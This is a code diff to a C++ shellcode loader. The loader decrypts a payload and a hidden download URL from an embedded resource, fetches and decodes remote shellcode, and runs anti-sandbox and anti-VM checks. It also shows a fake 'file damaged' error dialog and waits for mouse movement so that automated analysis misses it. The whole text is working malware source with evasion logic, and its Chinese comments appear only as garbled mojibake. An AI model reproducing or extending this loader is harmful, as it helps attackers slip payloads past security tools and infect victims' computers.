@@ -16,7 +16,7 @@ namespace fs = std::filesystem;
 unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize);
 
 /**********************************************************************
-½âÃÜShellcode´úÂë
+è§£å¯†Shellcodeä»£ç 
 **********************************************************************/
 void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
 {
@@ -75,25 +75,25 @@ std::string base64Decode(const std::string& input)
 	return output;
 }
 
-string FuckWdfAep(const string& strSrc, const char* aeskey) //AES½âÃÜ
+string FuckWdfAep(const string& strSrc, const char* aeskey) //AESè§£å¯†
 {
 	const char* k = aeskey;
 	const char* g = "gfdertfghjkuyrtg";
 	string strData = ko::Base64::decode(strSrc);
 	size_t length = strData.length();
-	//ÃÜÎÄ
+	//å¯†æ–‡
 	char* szDataIn = new char[length + 1];
 	memcpy(szDataIn, strData.c_str(), length + 1);
-	//Ã÷ÎÄ
+	//æ˜æ–‡
 	char* szDataOut = new char[length + 1];
 	memcpy(szDataOut, strData.c_str(), length + 1);
 
-	//½øĞĞAESµÄCBCÄ£Ê½½âÃÜ
+	//è¿›è¡ŒAESçš„CBCæ¨¡å¼è§£å¯†
 	AES aes;
 	aes.MakeKey(k, g, 16, 16);
 	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);
 
-	//È¥PKCS7PaddingÌî³ä
+	//å»PKCS7Paddingå¡«å……
 	if (0x00 < szDataOut[length - 1] <= 0x16)
 	{
 		int tmp = szDataOut[length - 1];
@@ -144,14 +144,14 @@ std::string gFS(int num)
 {
 	std::string fixedString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
 
-	std::mt19937 generator(num); // ÉèÖÃÏàÍ¬µÄÖÖ×ÓÖµ
+	std::mt19937 generator(num); // è®¾ç½®ç›¸åŒçš„ç§å­å€¼
 	std::shuffle(fixedString.begin(), fixedString.end(), generator);
 
-	return fixedString.substr(0, 16); // È¡Ç°16Î»×÷Îª¹Ì¶¨×Ö·û´®
+	return fixedString.substr(0, 16); // å–å‰16ä½ä½œä¸ºå›ºå®šå­—ç¬¦ä¸²
 }
 
 /**********************************************************************
-½âÃÜURL´úÂë
+è§£å¯†URLä»£ç 
 **********************************************************************/
 std::vector<unsigned char> hex_decode(const std::string& input)
 {
@@ -168,7 +168,7 @@ std::vector<unsigned char> hex_decode(const std::string& input)
 }
 
 /**********************************************************************
-ÅäÖÃÎÄ¼ş
+é…ç½®æ–‡ä»¶
 **********************************************************************/
 struct CONFIG
 {
@@ -178,7 +178,7 @@ struct CONFIG
 };
 
 /**********************************************************************
-·´É³Ïä
+åæ²™ç®±
 **********************************************************************/
 BOOL checkTempFolder()
 {
@@ -190,7 +190,7 @@ BOOL checkTempFolder()
 		return false;
 	}
 
-	// Æ´½ÓÂ·¾¶
+	// æ‹¼æ¥è·¯å¾„
 	wcscat(szTempPath, L"*.*");
 
 	std::wstring tempPath(szTempPath);
@@ -211,7 +211,7 @@ BOOL checkTempFolder()
 
 	FindClose(hFind);
 
-	// ÅĞ¶ÏÎÄ¼şÊıÁ¿ÊÇ·ñĞ¡ÓÚ30
+	// åˆ¤æ–­æ–‡ä»¶æ•°é‡æ˜¯å¦å°äº30
 	if (count < 30)
 	{
 		return false;
@@ -271,12 +271,12 @@ void AntiSimulation()
 }
 
 /**********************************************************************
-µöÓãÄ£Ê½
+é’“é±¼æ¨¡å¼
 **********************************************************************/
 DWORD WINAPI ThreadProc(LPVOID lpParameter)
 {
-	// ÌáÊ¾ÕıÔÚ½øĞĞ²¹¶¡¼ì²â
-	MessageBoxA(NULL, "ÎÄ¼şËğ»µ£¬Çë¸ü»»ÆäËüÓ¦ÓÃ³ÌĞò", "´íÎó", MB_OK);
+	// æç¤ºæ­£åœ¨è¿›è¡Œè¡¥ä¸æ£€æµ‹
+	MessageBoxA(NULL, "æ–‡ä»¶æŸåï¼Œè¯·æ›´æ¢å…¶å®ƒåº”ç”¨ç¨‹åº", "é”™è¯¯", MB_OK);
 	return 0;
 }
 
@@ -286,21 +286,21 @@ void AutoFishing()
 	const char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 	CreateThreadFunc createThreadAAddr = (CreateThreadFunc)GetProcAddress(GetModuleHandleA(kernel32), "CreateThread");
 
-	// ´´½¨×ÓÏß³Ì
+	// åˆ›å»ºå­çº¿ç¨‹
 	HANDLE hThread = createThreadAAddr(NULL, 0, ThreadProc, NULL, 0, NULL);
 
-	// ¹Ø±Õ×ÓÏß³Ì¾ä±ú
+	// å…³é—­å­çº¿ç¨‹å¥æŸ„
 	CloseHandle(hThread);
 
 	static POINT previousPos = { 0 };
 	POINT currentPos = { 0 };
 	int threshold = 5;
-	int duration = 5000; // Ê±¼äÏŞÖÆÎª5Ãë
+	int duration = 5000; // æ—¶é—´é™åˆ¶ä¸º5ç§’
 	auto startTime = std::chrono::high_resolution_clock::now();
-	bool shouldExit = false; // ±êÖ¾±äÁ¿£¬³õÊ¼ÖµÎªfalse
-	while (!shouldExit) // Ê¹ÓÃ±êÖ¾±äÁ¿À´¿ØÖÆÑ­»·
+	bool shouldExit = false; // æ ‡å¿—å˜é‡ï¼Œåˆå§‹å€¼ä¸ºfalse
+	while (!shouldExit) // ä½¿ç”¨æ ‡å¿—å˜é‡æ¥æ§åˆ¶å¾ªç¯
 	{
-		GetCursorPos(&currentPos); // ¸üĞÂµ±Ç°Êó±êÎ»ÖÃ
+		GetCursorPos(&currentPos); // æ›´æ–°å½“å‰é¼ æ ‡ä½ç½®
 
 		if (previousPos.x == 0 && previousPos.y == 0)
 		{
@@ -314,7 +314,7 @@ void AutoFishing()
 		if (abs(deltaX) > threshold || abs(deltaY) > threshold)
 		{
 			previousPos = currentPos;
-			shouldExit = true; // ÉèÖÃ±êÖ¾±äÁ¿Îªtrue£¬ÍË³öÑ­»·
+			shouldExit = true; // è®¾ç½®æ ‡å¿—å˜é‡ä¸ºtrueï¼Œé€€å‡ºå¾ªç¯
 			break;
 		}
 
@@ -334,18 +334,18 @@ void AutoFishing()
 
 void init(BOOL anti_sandbox, BOOL autofish)
 {
-	if (autofish)  //µöÓãÄ£Ê½
+	if (autofish)  //é’“é±¼æ¨¡å¼
 	{
 		AutoFishing();
 	}
-	if (anti_sandbox)  //·´ĞéÄâ»ú
+	if (anti_sandbox)  //åè™šæ‹Ÿæœº
 	{
 		AntiSimulation();
 	}
 }
 
 /**********************************************************************
-»ñÈ¡Shellcode´úÂë
+è·å–Shellcodeä»£ç 
 **********************************************************************/
 LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, char* buff)
 {
@@ -394,11 +394,10 @@ unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
 	init(config.antisandbox, config.autofish);
 
 	//4.Getshellcode
-	//ÏÂ±ê´Ó0¿ªÊ¼£¬ËùÒÔĞèÒª¼õÈ¥31£¬¶ø²»ÊÇ32
-	shellcodeSize = totalSize - sizeof(CONFIG) - 31;
+	shellcodeSize = totalSize - sizeof(CONFIG) - 32;
 	char* pByte = new char[shellcodeSize];
 	memcpy(pByte, (unsigned char*)pBuffer + sizeof(CONFIG) + 32, shellcodeSize);
-	StreamCrypt(reinterpret_cast<unsigned char*>(const_cast<char*>(pByte)), shellcodeSize, config.key, 128);
+	StreamCrypt((unsigned char*)pByte, shellcodeSize, config.key, 128);
 	std::string URLencode = pByte;
 	std::vector<unsigned char> decoded_URL = hex_decode(base64Decode(URLencode));
 	std::string strurl(decoded_URL.begin(), decoded_URL.end());
@@ -411,8 +410,9 @@ unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
 
 	//4. GetAESKey
 	char* aeskey = new char[33];
-	memcpy(aeskey, (unsigned char*)pBuffer + sizeof(CONFIG), 32);
-
+	memcpy(aeskey, (unsigned char*)pBuffer + sizeof(CONFIG), 33);
+	aeskey[32] = '\0';
+	
 	//5. DecodeShellcode
 	std::string dpD = rc4Encrypt(base64Decode(FuckWdfAep(st, aeskey)), gFS(12468));
 	const char* S = dpD.c_str();
